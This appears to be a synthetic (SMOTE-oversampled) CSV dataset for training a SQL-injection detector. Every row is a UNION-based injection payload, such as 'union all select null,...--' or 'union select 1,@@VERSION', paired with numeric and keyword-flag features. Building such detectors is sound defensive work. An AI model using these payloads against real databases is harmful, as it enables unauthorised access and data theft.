id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000066,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000173,0.2313325459465422,60.42883938041639,18.714419690208196,3.576509206525601,42.52403281701366,1.0,10.714419690208196,6.1903868731945355,0.7035844734664467,0.016563684238325938,0.17700815735264372,0.1028436849425837,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.1903868731945355,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.9647411138255986,76.60147352425902,15.325184190532376,2.997776340532676,54.0,1.0,9.95110514319426,11.650368381064753,0.7065788447083081,0.013084793420524238,0.1284723125250994,0.15186404934606834,0.3251841905323768,0.0,0.0,0.0,0.0,0.0,0.0,1.3251841905323767,0.0,0.0,9.0,0.0,0.3251841905323768,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000068,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000154,1.155344368165153,110.09805259545496,27.22548685113626,4.09172537672845,30.96077896181802,46.117663114545934,15.490194740454506,17.529415778636487,0.2858257258893253,0.4135865009802403,0.14232508981422826,0.1582626833162061,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.529415778636485,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.24509737022725242,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.245097370227253
SMOTE_000069,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,1.3430060810867117,75.24747594995486,28.876262025022566,4.096083146426519,41.16834936669675,2.707912658325812,20.66330126660649,10.707912658325812,0.5487587092075097,0.03580882510357106,0.27316302372045687,0.1422694419684624,0.0,0.0,2.0,0.0,1.292087341674189,1.0,0.0,1.4158253166516224,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7079126583258111,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000070,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000095,0.1846251587227654,57.94462668011829,19.0,3.7944171209585447,14.0,31.155701344094627,4.0,8.788925336023658,0.24867649407818518,0.5300083778579704,0.07105042687948147,0.15026470118436297,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.788925336023657,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000071,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000259,0.47226132960410544,45.099854995169565,22.0,4.068706174330084,14.0,16.079883996135656,8.0,7.019970999033914,0.31754637730346635,0.3463623181379052,0.18145507274483794,0.15463623181379052,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0199709990339136,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000072,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000172,0.9721411645960746,67.72373601456744,16.0,3.0881424980286156,50.57898881165394,1.0,4.0,12.144747202913488,0.7458882077063148,0.015031053414912537,0.06012421365965018,0.17895652521912242,0.21381319927162823,0.7861868007283717,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.144747202913488,2.0,0.21381319927162826,0.7861868007283717,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000073,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,0.588124410517896,66.53800617567072,21.60506749008943,3.859432249222182,14.0,26.420269960357714,15.210134980178857,10.907601235134143,0.2124985156138689,0.39571524703101824,0.22821455431749038,0.16357168303762248,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.3025337450447143,0.0,0.0,4.605067490089429,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000074,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,0.9267314551965767,83.28353086556885,27.432938268862287,3.9347677215241186,43.850592596706576,4.0,25.0,10.432938268862285,0.5264497071582308,0.04803010277362657,0.3001881423351662,0.12533204773297651,1.4329382688622847,1.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.7164691344311424,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000075,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000063,0.45955523028365236,74.84614179085858,22.745560275516706,3.7697520945833163,42.72780137758353,9.0,14.745560275516706,8.372780137758353,0.5695260871923171,0.12106449636527929,0.1973052038234336,0.11210421261897005,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.372780137758353,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000076,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.335828797202454,77.0,26.894823474253236,3.9436505858391153,40.0,3.0,23.0,11.0,0.5194805194805194,0.038961038961038974,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.552588262873383,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000077,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,0.9121953230021761,101.63234215945727,25.526468431891455,3.987817638349236,62.0,5.0,26.105873727565818,8.526468431891454,0.611138428886447,0.04928535716826185,0.2558896568623892,0.08368655708290204,0.0,0.0,2.0,0.0,2.0000000000000004,2.0,0.0,0.5264684318914539,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.26323421594572716,0.0,0.0,0.0,0.0,2.0,1.0,2.0,1.9999999999999998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000078,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000071,0.05578679646313472,54.422715446843654,17.0,3.359090302932042,30.338172357474917,1.0,14.0,9.08454308936873,0.5573069189888061,0.01838583947054498,0.2574017525876299,0.166905488953019,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.08454308936873,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000079,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000167,0.49477066598592595,98.9099406524737,24.60900593475263,3.69621289421481,56.127952521978955,9.0,22.0,11.781988130494739,0.566910138847809,0.09120907610303128,0.22295551936296532,0.11892526568619444,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.781988130494737,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000080,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000223,0.7682312961522126,42.612228355555686,16.0,3.362528495808879,26.0,1.0,10.239052876190584,5.373175479365097,0.613873437635932,0.023610516832151207,0.23652355755488186,0.12599248797703483,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.3731754793650972,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000081,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000231,0.2977084557309795,73.47588601327105,20.0,3.6850583319769674,14.0,43.16141762123368,4.419291189383161,11.89517720265421,0.19062624281515972,0.5869576810394372,0.060541324708435124,0.16187475143696808,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.10482279734579025,0.0,0.0,8.79035440530842,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.10482279734579025,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,union,"1   )    )    union all select null,null--",nearest_attack_euclidean,R000298,0.09303329805455438,41.668297615016556,15.0,3.2162944888628315,21.879380950915113,1.0,13.819071426372668,4.969845237728778,0.5255233889462907,0.024064287546070234,0.3310636200441015,0.11934870346353754,0.03015476227122238,0.0,2.0,0.0,0.0,0.0,0.0,1.9698452377287778,0.0,0.0,0.9698452377287778,2.0,0.030154762271222102,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000083,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000196,0.8966150478163666,78.51872757600597,21.370318105998503,3.5612458657230244,14.0,38.51872757600598,14.0,12.0,0.1784108246605125,0.4902547866842499,0.17841082466051253,0.15292356399472504,0.3703181059985051,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.629681894001495,1.0,0.3703181059985052,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000084,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R000247,0.3964396697689611,38.95661065184578,16.0,3.4490001499513085,28.365288521476625,1.0,4.0,5.591322130369155,0.7267312145017256,0.026167423392240874,0.10466969356896343,0.14243166853707012,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.5913221303691563,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000085,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000127,0.8477274742484099,48.03282684811212,21.576118121158874,3.9479157049281617,14.0,16.0,11.456708726953247,6.576118121158874,0.29302157937897966,0.3348818050045481,0.23521950499155347,0.13687711062491878,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5761181211588746,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000086,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,0.6672924081877918,76.3858297872085,23.0,3.757834561327046,43.30866382976679,9.0,14.0,10.077165957441698,0.5641336898641559,0.11925824669789872,0.18551282819673132,0.13109523524121408,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.077165957441699,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000087,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000033,1.710577897632133,79.9463395702356,29.378050358137006,4.080957427666461,43.297559713490394,4.0,22.973169785117797,9.675610071627402,0.5414321422012143,0.05009380978618094,0.28710130840873094,0.12137273960387382,0.0,0.324389928372599,2.0,0.0,1.0000000000000002,1.675610071627401,0.0,0.648779856745198,0.0,0.0,1.0,4.675610071627401,0.0,0.324389928372599,1.0,0.32438992837259917,0.0,1.0,0.32438992837259917,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000088,attack,union,"1%' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000171,1.0950198910337734,54.01949104119609,16.40389820823922,3.3058468531327074,38.0,1.0,5.615592832956871,9.403898208239218,0.7048783199846655,0.01854942947328067,0.10254145180464676,0.17403079873740707,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.40389820823921796,1.0,0.0,5.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.403898208239218,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000089,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.710782981070855,64.77814705231583,21.40728431589472,3.841488982025809,14.0,28.0,12.778147052315836,10.0,0.21644089425948948,0.43288178851897896,0.1960766784647534,0.1546006387567782,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7963578420526394,0.20364215794736062,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000090,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.27882412094619613,73.73430002450819,31.632849987745903,4.351182016309575,43.46860004901639,3.265699975491808,17.0,10.0,0.5892908132509318,0.04446737865075237,0.23059669398782842,0.13564511411048732,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,5.632849987745903,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000091,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000161,1.3627028119607612,48.401422269473194,15.400237044912199,3.089497908058458,23.6009481796488,1.0,18.0,5.800474089824399,0.4869616748893957,0.020735191358915883,0.373233444460486,0.11906968929120249,0.0,0.4002370449121995,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.4002370449121995,0.0,0.0,0.4002370449121995,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000092,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.6409148285027176,75.26761362472699,27.915482969091254,4.017477836275638,40.732386375273,2.0,21.718323843272245,10.81690340618175,0.5418415240372201,0.02658347455236587,0.2879088996198775,0.14366610179053654,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,1.6338068123634981,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8169034061817488,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000093,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.2927267662586769,87.63104527726333,20.0,3.489071036135111,57.10483622181066,9.0,10.0,11.526209055452664,0.6515298808633233,0.1027870055561608,0.11420778395128978,0.13147532962922615,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,8.526209055452664,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000094,attack,union,"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",nearest_attack_euclidean,R000238,0.6312797384327936,83.78350878055224,19.0,3.4307758290790806,14.0,38.0297855827131,18.0,13.753723197839138,0.16747672562251115,0.4529177301255266,0.21532721865751428,0.164278325594448,0.24627680216086156,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.507446395678276,3.0,0.2462768021608616,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,union,"1%' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.5630069157231744,54.476560282535544,16.0,3.249755343628642,39.98124822602843,1.0,4.0,9.495312056507109,0.7331505387332071,0.01856929479633132,0.07427717918532528,0.17400298728513613,0.876171985873223,0.12382801412677688,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.495312056507108,2.0,0.8761719858732231,0.12382801412677688,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000123,0.18103381219857348,108.48014660494414,27.69602932098883,3.9376826261126094,24.544043981483245,47.69602932098883,21.39205864197766,14.848014660494414,0.2260445629130862,0.44035517053246986,0.196622548010987,0.1369777185434569,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.9240073302472074,0.0,0.0,7.924007330247207,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.570099488268472,74.52940525741155,21.0,3.69896556913338,14.0,31.03528630889386,16.98823789703538,12.505881051482309,0.18844653224868538,0.4139087511911983,0.22994983637417676,0.16769488018593964,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.747059474258845,0.0,0.0,5.758821577223465,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000005,0.15256177699947937,77.55852842577592,27.441471574224074,3.941918660643823,40.0,3.0,23.558528425775926,11.0,0.5157607164450487,0.03868205373337866,0.3037230327991841,0.14183419702238842,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
